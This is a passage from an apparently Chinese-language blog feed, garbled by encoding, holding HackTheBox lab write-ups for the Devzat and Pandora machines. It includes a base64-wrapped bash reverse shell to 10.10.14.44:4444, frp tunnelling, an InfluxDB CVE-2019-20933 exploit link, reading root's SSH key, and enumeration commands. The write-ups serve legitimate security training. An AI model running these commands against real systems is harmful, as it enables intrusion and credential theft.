class="line">	apiHandler := http.HandlerFunc(petHandler)</span><br><span class="line">	http.Handle(<span class="string">&quot;/api/pet&quot;</span>, headerMiddleware(apiHandler))</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;:5000&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spaHandlerFunc</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	w.WriteHeader(http.StatusOK)</span><br><span class="line">	w.Write(index)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">petHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">// Dispatch by method</span></span><br><span class="line">	<span class="keyword">if</span> r.Method == http.MethodPost &#123;</span><br><span class="line">		addPet(w, r)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> r.Method == http.MethodGet &#123;</span><br><span class="line">		getPets(w, r)</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add Update and Delete</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">headerMiddleware</span><span class="params">(next http.Handler)</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		w.Header().Add(<span class="string">&quot;Server&quot;</span>, <span class="string">&quot;My genious go pet server&quot;</span>)</span><br><span class="line">		next.ServeHTTP(w, r)</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	resetTicker := time.NewTicker(<span class="number">5</span> * time.Second)</span><br><span class="line">	done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">select</span> &#123;</span><br><span class="line">			<span class="keyword">case</span> &lt;-done:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="keyword">case</span> &lt;-resetTicker.C:</span><br><span class="line">				<span class="comment">// Reset Pets to prestaged ones</span></span><br><span class="line">				Pets = []Pet&#123;</span><br><span class="line">					&#123;Name: <span class="string">&quot;Cookie&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Mia&quot;</span>, Species: <span class="string">&quot;cat&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;cat&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Chuck&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Balu&quot;</span>, Species: <span class="string">&quot;dog&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;dog&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Georg&quot;</span>, Species: <span class="string">&quot;gopher&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;gopher&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Gustav&quot;</span>, Species: <span class="string">&quot;giraffe&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;giraffe&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Rudi&quot;</span>, Species: <span class="string">&quot;redkite&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;redkite&quot;</span>)&#125;,</span><br><span class="line">					&#123;Name: <span class="string">&quot;Bruno&quot;</span>, Species: <span class="string">&quot;bluewhale&quot;</span>, Characteristics: loadCharacter(<span class="string">&quot;bluewhale&quot;</span>)&#125;,</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	handleRequest()</span><br><span class="line"></span><br><span class="line">	time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">	resetTicker.Stop()</span><br><span class="line">	done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†æ£€æµ‹æˆ‘ä»¬çš„ä»£ç å¯ä»¥æˆåŠŸè¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨pingå‘½ä»¤æ£€æµ‹æ˜¯å¦èƒ½pingé€šæˆ‘ä»¬æœ¬åœ°çš„æœºå™¨ï¼ŒæŠ“åŒ…å·¥å…·é€‰æ‹©tcpdumpè¾ƒä¸ºæ–¹ä¾¿<br><img src="https://img-blog.csdnimg.cn/6e33b2b67b2f4a719b747c1cd9ac9c6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/7c8fd2469cb14d8d9e75f60d9188bfca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿”å›çš„ç»“æœæ˜¯æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬çš„æ¶æ„ä»£ç è¿›è¡Œbase64ç¼–ç ï¼Œç›®çš„æ˜¯ä¸ºäº†ç¡®ä¿å‘½ä»¤æ‰§è¡Œæ—¶ä¸ä¼šå‡ºç°æ¸²æŸ“é—®é¢˜ã€‚payloadçš„è®¾ç½®æ˜¯ï¼šå…ˆå°†ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œè§£ç ä¹‹åä¼ ç»™ç®¡é“ç¬¦ä»¥bashå‘½ä»¤è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.44/4444 0&gt;&amp;1&#x27;</span> | base64</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ccb0abeb9681491f9ac925d4249f715a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/9ba6d6ecae5746bba902f3b7f0b88eb6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åå¼¹shellåˆ°æœ¬åœ°æœºå™¨ä¸Š<br><img src="https://img-blog.csdnimg.cn/22566d53b80f46d79d780b9871c10674.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒåˆ°catherine"><a href="#ææƒåˆ°catherine" class="headerlink" title="ææƒåˆ°catherine"></a>ææƒåˆ°catherine</h2><p>æ‹¿åˆ°shellåï¼Œå‘ç°æˆ‘ä»¬å¹¶æ²¡æœ‰æƒé™æŸ¥çœ‹user.txtæ–‡ä»¶çš„æƒé™ï¼Œå¹¶ä¸”homeç›®å½•ä¸‹å­˜åœ¨å¦ä¸€ä¸ªè´¦æˆ·<code>catherine</code>ã€‚åˆæ­¥åˆ¤æ–­åº”è¯¥æ˜¯è¦ææƒåˆ°è¿™ä¸ªç”¨æˆ·æƒé™ä¸Šã€‚æˆ‘ä»¬ä½¿ç”¨ä¸‡èƒ½ææƒè„šæœ¬<code>linpeas.sh</code>ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œï¼Œå‘ç°ç›®æ ‡æœºå™¨ä¸Šä»¥rootæƒé™è¿è¡Œç€ä¸€ä¸ªdockerä»£ç†ç¨‹åºï¼Œå¹¶ä¸”è¿è¡Œçš„ç«¯å£ä¸º8086<br><img src="https://img-blog.csdnimg.cn/7af7e79e6cb54a40b1dc0c7b52e9be19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºç›®æ ‡æœºå™¨çš„8086ç«¯å£å¯¹å¤–ç½‘ä¸å¼€æ”¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä½¿ç”¨å†…ç½‘ç©¿é€å·¥å…·ï¼Œåˆ©ç”¨ç«¯å£è½¬å‘æŠ€æœ¯å°†8086ç«¯å£è½¬å‘åˆ°æˆ‘ä»¬çš„VPSæœºå™¨ä¸Šè¿›è¡Œè®¿é—®ï¼Œæ‰€ä½¿ç”¨çš„å·¥å…·æ˜¯frpã€‚æˆ‘ä»¬å…ˆä¸Šä¼ å®¢æˆ·ç«¯åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œå¹¶åœ¨æœ¬æœºä¸Šè¿è¡ŒæœåŠ¡ç«¯<br><img src="https://img-blog.csdnimg.cn/a16b934148f34fa8a7b8a708f2178fea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å®¢æˆ·ç«¯é…ç½®ä¿¡æ¯ï¼Œserver_addræ˜¯æœ¬æœºåœ°å€ï¼Œserver_portä¸ç”¨æ›´æ”¹ï¼Œlocal_portæ˜¯è¦è½¬å‘åˆ°æœ¬åœ°æœºå™¨çš„ç«¯å£ï¼Œremote_portæ˜¯è¦è¢«è½¬å‘çš„æœºå™¨çš„ç›®æ ‡ç«¯å£<br><img src="https://img-blog.csdnimg.cn/df2fddfbe7544441b83fd61835a4b155.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç©¿é€ä»£ç†æ­å»ºæˆåŠŸåï¼Œæˆ‘ä»¬å¯ä»¥æ‰«ææœ¬åœ°æœºå­çš„8086ç«¯å£ï¼Œäº†è§£åˆ°å¼€æ”¾çš„æ˜¯<code>InfluxDB</code>æœåŠ¡<br><img src="https://img-blog.csdnimg.cn/3ca9e0134de24babb975067b86a49651.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨EDBä¸Šå°è¯•è¿‡å¾ˆå¤šçš„expï¼Œä½†æ˜¯éƒ½æ²¡æœ‰æˆåŠŸã€‚ä½†æ˜¯åœ¨githubä¸Šå‘ç°äº†ä¸€ä¸ªæŠ«éœ²äº†çš„expï¼Œç»è¿‡éªŒè¯å‘ç°å¯ä»¥åˆ©ç”¨æˆåŠŸï¼Œé“¾æ¥åœ°å€ä¸º<a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</a><br><img src="https://img-blog.csdnimg.cn/3f3e1f4fbd72404f823d75c83181d7fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°äº†ä¸¤ä¸ªæ•°æ®åº“ï¼Œä¸€ä¸ªæ•°æ®è¡¨ï¼Œå¹¶æŸ¥è¯¢æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œå‘ç°äº†<code>catherine</code>ç”¨æˆ·åçš„å¯†ç <br><img src="https://img-blog.csdnimg.cn/350fb64176ea4290b7efdb38a6d9e844.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/db24633ea9ea427fa1d00fcdf845252b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/9dbe54a67fd7458c9132ff68b0285457.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆå°±è·å–åˆ°äº†user.txtæ–‡ä»¶çš„æƒé™äº†<br><img src="https://img-blog.csdnimg.cn/32ae8ee62ba2425a94b71552d0a6f221.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒåˆ°ROOT"><a href="#ææƒåˆ°ROOT" class="headerlink" title="ææƒåˆ°ROOT"></a>ææƒåˆ°ROOT</h2><p>æ²¡åŠæ³•ï¼Œæˆ‘ä»¬æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿæ²¡æ‰¾åˆ°ä¸ªæ‰€ä»¥ç„¶ï¼Œåªèƒ½å†è¿è¡Œä¸€éç¥å™¨<code>linpeas.sh</code>è¿™ä¸ªè„šæœ¬äº†ã€‚åœ¨<code>/var/backups</code>è¿™ä¸ªç›®å½•ä¸Šï¼Œå‘ç°äº†å¾ˆå¤šæœ‰è¶£çš„æ–‡ä»¶ï¼Œå¦‚<code>devzat-main.zipã€devzat-dev.zip</code>è¿™ä¸¤ä¸ªå‹ç¼©åŒ…<br><img src="https://img-blog.csdnimg.cn/c525a8de4c3d4b40a111283e562b2b51.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†å…¶å¤åˆ¶åˆ°tmpç›®å½•è§£å‹ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„commands.goæ–‡ä»¶å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ç‚¹ï¼Œæ¯”è¾ƒmainç›®å½•å’Œdevç›®å½•ä¸‹çš„commands.goæ–‡ä»¶çš„ä¸åŒå‘ç°æœ‰ä¸€å¤„å¯¹å¯†ç è¿›è¡Œæ ¡éªŒã€‚è¿™é‡Œæˆ‘ä»¬è¦æ³¨æ„ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯fileCommandçš„æ–¹æ³•ï¼Œå¦ä¸€ä¸ªæ˜¯æ ¡éªŒå®‰å…¨å¯†ç ï¼Œå¦‚æœå¯†ç ä¸å¯¹ç›´æ¥ç»“æŸæ–¹æ³•ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diff commands.go ../dev/commands.go</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/29c143180e4443d18159280a01e19b46.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨å®¡è®¡GOä»£ç æ—¶ï¼Œæˆ‘ä»¬å‘ç°å¯¹åº”çš„æ–¹æ³•åå­—å°±æ˜¯æˆ‘ä»¬èƒ½æ‰§è¡Œå‘½ä»¤çš„åå­—ï¼Œä½†æ˜¯å”¯ç‹¬ç¼ºå°‘äº†è¿™ä¸ªfileå‘½ä»¤ï¼Œè€Œä¸”è¿˜å­˜åœ¨æ ¡éªŒå¯†ç çš„ç¯èŠ‚ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ˜¯çªç ´å£ã€‚åœ¨å®¡è®¡devç›®å½•ä¸‹çš„<code>devchat.go</code>æ–‡ä»¶å‘ç°ï¼Œdevç›®å½•çš„åŠŸèƒ½æ˜¯è¿è¡Œåœ¨ç›®æ ‡ä¸»æœºçš„8443ç«¯å£<br><img src="https://img-blog.csdnimg.cn/7394175f0acc43df862c9682f307a261.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/8ea29539414a45bd9212598564ebf766.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘å‘ç°åœ¨åå¼¹çš„shellä¸­ï¼Œå¹¶ä¸èƒ½å®ç°sshçš„å†…éƒ¨ç«¯å£è¿æ¥ã€‚ä½†æ˜¯å¾ˆå¹¸è¿æˆ‘åœ¨.sshä¸­æ‰¾åˆ°äº†ç™»å½•å‡­æ®<br><img src="https://img-blog.csdnimg.cn/498aedec26e24f7992495a71c3752cc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/7bb674ed77754fd983ba72c1fca5871a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆåŠŸä½¿ç”¨patrickè´¦æˆ·ç™»å½•<br><img src="https://img-blog.csdnimg.cn/c15e1617dda34fca9a8907f068b10ba9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æ²¡æœ‰å¯†ç ï¼Œå‡æŠ¥é”™<br><img src="https://img-blog.csdnimg.cn/e925745b20b0407da04aac8ff435be8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•ä½¿ç”¨å¯†ç çœ‹çœ‹è¿”å›ä¿¡æ¯æœ‰ä»€ä¹ˆä¸åŒï¼Œå®ƒè¯´ä¸å­˜åœ¨è¿™ä¸ªç›®å½•ï¼Œé‚£æˆ‘ä»¬è¿”å›ä¸Šä¸€ç›®å½•ç›´æ¥è¯»å–åˆ°flagäº†<br><img src="https://img-blog.csdnimg.cn/4e14ed39838a46aeaffee1d47487d666.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/81bc37ed464242f087cb32aea8552a80.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»å–rootçš„id_rsaè¿›è¡Œè·å–rootæƒé™<br><img src="https://img-blog.csdnimg.cn/ceb27ddf47dd414e87f7ecebb2dc7d59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/aa49ba11351148f482600c39b2b45ceb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ€»çš„æ¥è¯´è¿™ä¸ªé¶æœºç›¸å½“å¤æ‚ï¼ŒåŒæ—¶è€ƒéªŒGOè¯­è¨€çš„ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œè·å–æƒé™çš„æ–¹å¼æ¯”è¾ƒå¤æ‚ï¼Œä½†æ˜¯æ›´åŠ åå‘äºå®æˆ˜ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å‡ºè‰²çš„é¶æœºã€‚</p>
]]></content>
      <categories>
        <category>RCE</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandora</title>
    <url>/2022/01/29/Pandora/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ä½¿ç”¨nmapè¿›è¡Œæ‰«æï¼Œå‘ç°å¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/48eada2d8ed648a595409ecb9caca3d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®webæœåŠ¡åï¼Œå¹¶ä¸”è¿›è¡Œäº†ç›®å½•æ‰«æï¼Œå¹¶æ²¡æœ‰å‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/fe6b324e74084ed0928913421517ca43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/ed3d2aea22f248afb8426175c235d2c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>åˆ‡æ¢ä¸€ä¸ªæ€è·¯ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å­åŸŸåï¼Œç»“æœä¹Ÿæ˜¯è½ç©º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -u <span class="string">&quot;http://pandora.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 33560 -H <span class="string">&quot;HOST:FUZZ.pandora.htb&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/afadb89eddb94b41bdfafaf6a93b236f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è‡³æ­¤ï¼Œæˆ‘çš„æ€è·¯æ–­äº†ã€‚æƒ³äº†å¾ˆä¹…å‘ç°ä¼šä¸ä¼šä¿¡æ¯æ”¶é›†çš„æ—¶å€™åšå¾—ä¸å¤Ÿç»†ï¼Œç„¶åå†å»æ‰«æUDPçš„ç«¯å£æœåŠ¡ï¼Œæœ‰å‘ç°æ–°çš„çªç ´å£ã€‚ç›®æ ‡ä¸»æœºå¼€æ”¾äº†snmpæœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨snmpwalkå·¥å…·å¯¹snmpçš„ä¿¡æ¯è¿›è¡Œæ›´ä»”ç»†åœ°æ‰«æã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A -sU -oN udp_result -top-ports=20 pandora.htb</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>æ³¨ï¼š-top-portså‚æ•°æ˜¯æ‰«æå¼€æ”¾æ¦‚ç‡æœ€é«˜çš„ number ä¸ªç«¯å£ï¼Œå‡ºç°çš„æ¦‚ç‡éœ€è¦ å‚è€ƒ nmap-services æ–‡ä»¶</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/18f56ac60b064d3f8f0a54448943b8dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 2c pandora.htb -c public &gt; pandora.snmp</span><br></pre></td></tr></table></figure>
<p>ä¿¡æ¯é‡æ¯”è¾ƒå¤§ï¼Œéœ€è¦æˆ‘ä»¬ä¸€ç‚¹ç‚¹ä»”ç»†åœ°æœç´¢ï¼Œå‘ç°å­˜åœ¨äº†è´¦æˆ·å’Œå¯†ç ã€‚<br><img src="https://img-blog.csdnimg.cn/1dad4db69f9c4b5cac4313a48bfdd81c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬å°è¯•ç™»å½•ï¼Œå‘ç°è¿˜å­˜åœ¨å¦ä¸€ä¸ªç”¨æˆ·mattï¼Œä½†æ˜¯æ²¡æœ‰æƒé™æŸ¥çœ‹åˆ°user.txtæ–‡ä»¶ï¼Œç›®æµ‹åº”è¯¥æ˜¯è¦ææƒåˆ°mattç”¨æˆ·æƒé™ä¸Šå»<br><img src="https://img-blog.csdnimg.cn/62b8997975c64b5d8c6401a090658316.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹å¯¹åº”çš„ç«¯å£æœåŠ¡æ—¶ï¼Œå‘ç°æœ¬åœ°è¿è¡Œäº†ä¸€ä¸ªwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/25dd276877264e0db29d0adf34018fcc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/d864bcd769264cf58355770bea67dd43.png" 